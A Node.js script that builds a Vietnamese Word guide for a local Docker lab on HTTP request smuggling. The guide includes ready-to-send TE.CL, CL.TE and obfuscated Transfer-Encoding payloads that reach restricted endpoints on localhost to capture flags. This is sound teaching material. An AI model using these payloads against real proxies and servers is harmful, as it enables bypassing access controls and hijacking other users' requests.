const fs = require('fs');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell, 
        AlignmentType, HeadingLevel, BorderStyle, WidthType, ShadingType, 
        VerticalAlign, LevelFormat, PageBreak } = require('docx');

const tableBorder = { style: BorderStyle.SINGLE, size: 1, color: "CCCCCC" };
const cellBorders = { top: tableBorder, bottom: tableBorder, left: tableBorder, right: tableBorder };

const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 24 } } },
    paragraphStyles: [
      { id: "Title", name: "Title", basedOn: "Normal",
        run: { size: 56, bold: true, color: "1a237e", font: "Arial" },
        paragraph: { spacing: { before: 240, after: 240 }, alignment: AlignmentType.CENTER } },
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, color: "1976d2", font: "Arial" },
        paragraph: { spacing: { before: 360, after: 180 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, color: "424242", font: "Arial" },
        paragraph: { spacing: { before: 240, after: 120 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, color: "616161", font: "Arial" },
        paragraph: { spacing: { before: 180, after: 100 }, outlineLevel: 2 } },
      { id: "Code", name: "Code", basedOn: "Normal",
        run: { font: "Courier New", size: 20, color: "000000" },
        paragraph: { spacing: { before: 120, after: 120 }, indent: { left: 360 } } },
      { id: "Warning", name: "Warning", basedOn: "Normal",
        run: { size: 22, color: "d84315" },
        paragraph: { spacing: { before: 120, after: 120 } } }
    ]
  },
  numbering: {
    config: [
      { reference: "bullet-list",
        levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
      { reference: "numbered-list-1",
        levels: [{ level: 0, format: LevelFormat.DECIMAL, text: "%1.", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] }
    ]
  },
  sections: [{
    properties: {
      page: { margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } }
    },
    children: [
      new Paragraph({
        heading: HeadingLevel.TITLE,
        children: [new TextRun("HTTP REQUEST SMUGGLING LAB")]
      }),
      
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({
          text: "Hướng dẫn cài đặt và khai thác lỗ hổng",
          size: 24,
          color: "666666"
        })]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("1. Giới thiệu về HTTP Request Smuggling")]
      }),
      
      new Paragraph({
        children: [new TextRun("HTTP Request Smuggling là kỹ thuật tấn công lợi dụng sự khác biệt trong cách xử lý HTTP headers giữa frontend server (reverse proxy, load balancer) và backend server. Khi hai server xử lý độ dài request body khác nhau, attacker có thể \"đưa lậu\" (smuggle) một request bổ sung vào connection, khiến backend server nhầm lẫn và xử lý sai.")]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("1.1. Các loại lỗ hổng")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_3,
        children: [new TextRun("TE.CL (Transfer-Encoding vs Content-Length)")]
      }),
      
      new Paragraph({
        children: [new TextRun("Frontend xử lý Transfer-Encoding: chunked, Backend xử lý Content-Length. Attacker gửi request với cả hai headers, frontend đọc toàn bộ chunked data nhưng backend chỉ đọc theo Content-Length.")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_3,
        children: [new TextRun("CL.TE (Content-Length vs Transfer-Encoding)")]
      }),
      
      new Paragraph({
        children: [new TextRun("Frontend xử lý Content-Length, Backend xử lý Transfer-Encoding: chunked. Frontend đọc ít hơn, phần còn lại được backend tiếp tục đọc như một request mới.")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_3,
        children: [new TextRun("Obfuscating TE")]
      }),
      
      new Paragraph({
        children: [new TextRun("Sử dụng các kỹ thuật obfuscate Transfer-Encoding header (thêm space, tab, ký tự đặc biệt) để một server nhận diện được còn server kia thì không, tạo ra sự mâu thuẫn.")]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("2. Yêu cầu hệ thống")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Docker và Docker Compose đã được cài đặt")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Burp Suite Community hoặc Professional")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Trình duyệt web (Chrome, Firefox, hoặc Edge)")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Kiến thức cơ bản về HTTP protocol")]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("3. Cài đặt Lab")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("3.1. Cấu trúc thư mục")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "http-smuggling-lab/\n├── docker-compose.yml\n├── frontend/\n│   ├── nginx.conf\n│   └── html/index.html\n├── backend-te-cl/\n│   ├── nginx.conf\n│   └── html/index.php\n├── backend-cl-te/\n│   ├── nginx.conf\n│   └── html/index.php\n└── backend-obfuscate/\n    ├── nginx.conf\n    └── html/index.php",
          font: "Courier New"
        })]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("3.2. Khởi động Lab")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 1:", bold: true }), new TextRun(" Mở terminal và di chuyển vào thư mục lab")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({ text: "cd http-smuggling-lab", font: "Courier New" })]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 2:", bold: true }), new TextRun(" Khởi động các container Docker")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({ text: "docker-compose up -d", font: "Courier New" })]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 3:", bold: true }), new TextRun(" Kiểm tra các container đang chạy")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({ text: "docker-compose ps", font: "Courier New" })]
      }),
      
      new Paragraph({
        children: [new TextRun("Bạn sẽ thấy 5 container đang chạy: frontend, backend-te-cl, backend-cl-te, backend-obfuscate, và php-fpm.")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 4:", bold: true }), new TextRun(" Truy cập lab")]
      }),
      
      new Paragraph({
        children: [new TextRun("Mở trình duyệt và truy cập: "), new TextRun({ text: "http://localhost:8080", bold: true })]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("4. Cấu hình Burp Suite")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("4.1. Cấu hình Proxy")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Mở Burp Suite")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Vào Proxy > Options")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Đảm bảo proxy listener đang chạy trên 127.0.0.1:8080")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Cấu hình browser để sử dụng proxy 127.0.0.1:8080")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("4.2. Cài đặt quan trọng")]
      }),
      
      new Paragraph({
        style: "Warning",
        children: [new TextRun({ text: "⚠️ LƯU Ý QUAN TRỌNG", bold: true })]
      }),
      
      new Paragraph({
        children: [new TextRun("Vào Repeater > Options và TẮT các tùy chọn sau:")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Update Content-Length")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Unpack gzip/deflate")]
      }),
      
      new Paragraph({
        children: [new TextRun("Điều này rất quan trọng để Burp không tự động sửa đổi các headers mà chúng ta cần để tấn công.")]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("5. Lab 1: Khai thác TE.CL")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("5.1. Mô tả")]
      }),
      
      new Paragraph({
        children: [new TextRun("Trong lab này, frontend xử lý Transfer-Encoding: chunked, nhưng backend xử lý Content-Length. Mục tiêu là truy cập endpoint /admin bị restrict.")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("5.2. Các bước khai thác")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 1:", bold: true }), new TextRun(" Truy cập http://localhost:8080/te-cl/ trong trình duyệt")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 2:", bold: true }), new TextRun(" Bật Intercept trong Burp Suite")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 3:", bold: true }), new TextRun(" Gửi request bất kỳ và intercept nó")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 4:", bold: true }), new TextRun(" Send to Repeater và thay đổi request thành payload sau:")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "POST /te-cl/index.php HTTP/1.1\nHost: localhost:8080\nContent-Length: 4\nTransfer-Encoding: chunked\n\n5c\nGET /te-cl/admin HTTP/1.1\nHost: localhost:8080\nContent-Length: 10\n\nx=\n0\n\n",
          font: "Courier New"
        })]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("5.3. Giải thích Payload")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Content-Length: 4", bold: true }), new TextRun(" - Backend sẽ đọc 4 bytes đầu tiên (\"5c\\r\\n\")")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Transfer-Encoding: chunked", bold: true }), new TextRun(" - Frontend đọc toàn bộ chunked data")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "5c", bold: true }), new TextRun(" - Chunk size (92 bytes in hex)")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Phần còn lại sẽ được backend xử lý như một request mới đến /admin")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("5.4. Kết quả mong đợi")]
      }),
      
      new Paragraph({
        children: [new TextRun("Bạn sẽ thấy response trả về nội dung của trang admin cùng với flag:")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "Welcome to Admin Panel!\nFlag: FLAG{TE_CL_SMUGGLING_SUCCESS}",
          font: "Courier New",
          color: "00796b"
        })]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("6. Lab 2: Khai thác CL.TE")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("6.1. Mô tả")]
      }),
      
      new Paragraph({
        children: [new TextRun("Trong lab này, frontend xử lý Content-Length, nhưng backend xử lý Transfer-Encoding: chunked. Mục tiêu là truy cập endpoint /private cần authentication.")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("6.2. Các bước khai thác")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 1:", bold: true }), new TextRun(" Truy cập http://localhost:8080/cl-te/ trong trình duyệt")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 2:", bold: true }), new TextRun(" Intercept request và gửi đến Repeater")]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Bước 3:", bold: true }), new TextRun(" Thay đổi request thành payload sau:")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "POST /cl-te/index.php HTTP/1.1\nHost: localhost:8080\nContent-Length: 35\nTransfer-Encoding: chunked\n\n0\n\nGET /cl-te/private HTTP/1.1\nX: X",
          font: "Courier New"
        })]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("6.3. Giải thích Payload")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Content-Length: 35", bold: true }), new TextRun(" - Frontend chỉ đọc 35 bytes")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Transfer-Encoding: chunked", bold: true }), new TextRun(" - Backend đọc theo chunked")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "0", bold: true }), new TextRun(" - Kết thúc chunked encoding cho backend")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("Phần còn lại (GET /cl-te/private) sẽ nằm trong connection và được xử lý như request tiếp theo")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("6.4. Kỹ thuật nâng cao")]
      }),
      
      new Paragraph({
        children: [new TextRun("Để tấn công thành công, bạn cần gửi request "), new TextRun({ text: "HAI LẦN", bold: true }), new TextRun(":")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Lần 1: Smuggle request vào connection")]
      }),
      
      new Paragraph({
        numbering: { reference: "numbered-list-1", level: 0 },
        children: [new TextRun("Lần 2: Gửi request bình thường, backend sẽ xử lý smuggled request")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("6.5. Kết quả mong đợi")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "Private Data!\nFlag: FLAG{CL_TE_SMUGGLING_SUCCESS}",
          font: "Courier New",
          color: "00796b"
        })]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("7. Lab 3: Khai thác Obfuscating TE")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("7.1. Mô tả")]
      }),
      
      new Paragraph({
        children: [new TextRun("Lab này sử dụng các kỹ thuật obfuscate Transfer-Encoding header để một server nhận diện được nhưng server kia thì không. Mục tiêu là truy cập endpoint /secret.")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("7.2. Các kỹ thuật Obfuscation")]
      }),
      
      new Table({
        columnWidths: [3120, 6240],
        margins: { top: 100, bottom: 100, left: 180, right: 180 },
        rows: [
          new TableRow({
            tableHeader: true,
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                shading: { fill: "1976d2", type: ShadingType.CLEAR },
                children: [new Paragraph({
                  alignment: AlignmentType.CENTER,
                  children: [new TextRun({ text: "Kỹ thuật", bold: true, color: "FFFFFF" })]
                })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                shading: { fill: "1976d2", type: ShadingType.CLEAR },
                children: [new Paragraph({
                  alignment: AlignmentType.CENTER,
                  children: [new TextRun({ text: "Ví dụ", bold: true, color: "FFFFFF" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Space trước dấu :")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({
                  style: "Code",
                  children: [new TextRun({ text: "Transfer-Encoding : chunked", font: "Courier New" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Space sau giá trị")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({
                  style: "Code",
                  children: [new TextRun({ text: "Transfer-Encoding: chunked ", font: "Courier New" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Tab thay vì space")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({
                  style: "Code",
                  children: [new TextRun({ text: "Transfer-Encoding:[tab]chunked", font: "Courier New" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Thêm prefix")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({
                  style: "Code",
                  children: [new TextRun({ text: "Transfer-Encoding: xchunked", font: "Courier New" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Multiple values")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({
                  style: "Code",
                  children: [new TextRun({ text: "Transfer-Encoding: chunked, identity", font: "Courier New" })]
                })]
              })
            ]
          })
        ]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("7.3. Payload mẫu")]
      }),
      
      new Paragraph({
        children: [new TextRun("Thử các payload khác nhau với obfuscated Transfer-Encoding:")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "POST /obfuscate/index.php HTTP/1.1\nHost: localhost:8080\nContent-Length: 4\nTransfer-Encoding : chunked\n\n5e\nGET /obfuscate/secret HTTP/1.1\nHost: localhost:8080\nContent-Length: 10\n\nx=\n0\n\n",
          font: "Courier New"
        })]
      }),
      
      new Paragraph({
        children: [new TextRun({ text: "Lưu ý:", bold: true }), new TextRun(" Space sau \"Transfer-Encoding\" và trước dấu \":\"")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("7.4. Kết quả mong đợi")]
      }),
      
      new Paragraph({
        style: "Code",
        children: [new TextRun({
          text: "Secret Information!\nFlag: FLAG{OBFUSCATE_TE_SMUGGLING_SUCCESS}",
          font: "Courier New",
          color: "00796b"
        })]
      }),
      
      new Paragraph({ children: [new PageBreak()] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("8. Tips và Troubleshooting")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("8.1. Tips quan trọng")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Timing là quan trọng:", bold: true }), new TextRun(" Đối với CL.TE, cần gửi request hai lần")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Tắt tự động update headers:", bold: true }), new TextRun(" Trong Burp Suite Repeater settings")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Kiểm tra logs:", bold: true }), new TextRun(" Sử dụng docker-compose logs để debug")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun({ text: "Test từng bước:", bold: true }), new TextRun(" Kiểm tra xem request có đến được backend không")]
      }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_2,
        children: [new TextRun("8.2. Common Issues")]
      }),
      
      new Table({
        columnWidths: [3120, 6240],
        margins: { top: 100, bottom: 100, left: 180, right: 180 },
        rows: [
          new TableRow({
            tableHeader: true,
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                shading: { fill: "c62828", type: ShadingType.CLEAR },
                children: [new Paragraph({
                  alignment: AlignmentType.CENTER,
                  children: [new TextRun({ text: "Vấn đề", bold: true, color: "FFFFFF" })]
                })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                shading: { fill: "c62828", type: ShadingType.CLEAR },
                children: [new Paragraph({
                  alignment: AlignmentType.CENTER,
                  children: [new TextRun({ text: "Giải pháp", bold: true, color: "FFFFFF" })]
                })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Container không khởi động")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Kiểm tra port 8080 đã bị chiếm chưa, thử docker-compose down -v và up lại")] })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Request không hoạt động")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Kiểm tra đã tắt Update Content-Length trong Burp chưa")] })]
              })
            ]
          }),
          new TableRow({
            children: [
              new TableCell({
                borders: cellBorders,
                width: { size: 3120, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Không thấy flag")] })]
              }),
              new TableCell({
                borders: cellBorders,
                width: { size: 6240, type: WidthType.DXA },
                children: [new Paragraph({ children: [new TextRun("Đối với CL.TE, nhớ gửi request hai lần liên tiếp")] })]
              })
            ]
          })
        ]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        heading: HeadingLevel.HEADING_1,
        children: [new TextRun("9. Tài liệu tham khảo")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("PortSwigger Web Security Academy - HTTP Request Smuggling")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("OWASP - HTTP Request Smuggling")]
      }),
      
      new Paragraph({
        numbering: { reference: "bullet-list", level: 0 },
        children: [new TextRun("RFC 7230 - HTTP/1.1 Message Syntax and Routing")]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        style: "Warning",
        children: [new TextRun({ text: "⚠️ CẢNH BÁO", bold: true })]
      }),
      
      new Paragraph({
        children: [new TextRun("Lab này được thiết kế chỉ cho mục đích học tập và nghiên cứu bảo mật. Không được sử dụng các kỹ thuật này trên hệ thống thực tế mà không có sự cho phép hợp pháp. Việc khai thác lỗ hổng trái phép là bất hợp pháp và có thể bị truy tố hình sự.")]
      }),
      
      new Paragraph({ children: [new TextRun("")] }),
      
      new Paragraph({
        alignment: AlignmentType.CENTER,
        children: [new TextRun({
          text: "--- HẾT ---",
          bold: true,
          size: 28
        })]
      })
    ]
  }]
});

Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync("/mnt/user-data/outputs/HTTP-Smuggling-Lab-Guide.docx", buffer);
  console.log("Document created successfully!");
});
